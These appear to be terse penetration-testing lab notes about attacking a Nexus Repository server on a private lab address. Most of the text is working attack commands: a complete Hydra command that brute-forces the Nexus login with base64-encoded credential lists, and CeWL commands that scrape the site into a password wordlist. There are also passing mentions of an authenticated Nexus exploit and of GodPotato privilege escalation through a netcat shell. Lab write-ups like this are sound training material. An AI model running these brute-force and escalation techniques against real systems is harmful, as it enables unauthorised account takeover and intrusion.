- Nexus had an exploit 49385 and its authenticated
- Bruteforce is the challenge

```bash
# -I : ignore any restore files
# -f : stop when a login is found
# -L : username list
# -P : password list
# ^USER64^ and ^PASS64^ tells hydra to base64-encode the values
# C=/ tells hydra to establish session cookies at this URL
# F=403 tells hydra that HTTP 403 means invalid login
hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
```

```bash
cewl http://192.168.233.61:8081/ | grep -v CeWL > custom-wordlist.txt
cewl --lowercase http://192.168.233.61:8081/ | grep -v CeWL  >> custom-wordlist.txt
```

- For godpotato the MSFShell hanged and only NC worked